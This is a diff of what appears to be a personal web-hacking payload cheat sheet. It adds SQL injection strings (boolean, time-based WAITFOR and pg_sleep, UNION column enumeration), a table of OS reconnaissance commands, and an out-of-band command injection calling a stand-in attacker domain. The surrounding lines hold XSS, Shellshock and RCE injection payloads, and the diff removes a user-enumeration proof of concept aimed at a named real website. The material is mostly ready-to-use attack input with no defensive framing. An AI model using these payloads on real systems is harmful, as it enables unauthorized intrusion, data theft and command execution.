@@ -3,10 +3,18 @@ sql injection
 1'"
 'XOR(if(now()=sysdate(),sleep(10*5),0))OR'
 
+'--
+?id=1\
+admin--
+
+
+
+' or 1=1--
+
 vanilla
 
 and true /false
-and 1=1 , 1=2
+1' and 1=1 , 1=2 --+
 
 sleep(10)--
 
@@ -26,11 +34,25 @@ oob
 
 ';--
 
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'-- 
+
  And 1 = sleep(2);--
+ 
+ x'||pg_sleep(10)--
  
  UNION (SELECT 1,2,3 FROM dual);--%';
  
  UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.TABLES);--
+
+
+
+order by 1,2,3 && UNION SELECT NULL-- -- to know no.of columns
+union select ----- to know which column is vulnerable
+ UNION SELECT NULL,'a',NULL,NULL-- -- to know compatable data type
+
+
+
 
 
 
@@ -79,6 +101,9 @@ https://www.youtube.com/watch?v=eW4QDUytHrY --  useragent:  () { :; }; /usr/bin/
 header("Location: http://localhost:25");
 ?>
 
+
+
+
 XSS
 /?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e 
 
@@ -95,6 +120,16 @@ RCE
 
 & ping -c 10 127.0.0.1 & 
 & whoami > /var/www/static/whoami.txt & 
+
+Purpose of command 	   Linux 			Windows
+Name of current user 	whoami 			whoami
+Operating system 		uname -a 		ver
+Network configuration 	ifconfig 		ipconfig /all
+Network connections 	netstat -an 	netstat -an
+Running processes 		ps -ef 			tasklist 
+
+& nslookup kgji2ohoyw.web-attacker.com & 
+
 
 
 
@@ -137,10 +172,6 @@ SSTI
 
 
 
-
-
-
-
 CORS
 
 https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
@@ -160,7 +191,5 @@ https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
 
 
 
-word press
 
-PoC: https://www.dctx.ph/?rest_route=/wp/v2/users
-
+Request smuggling
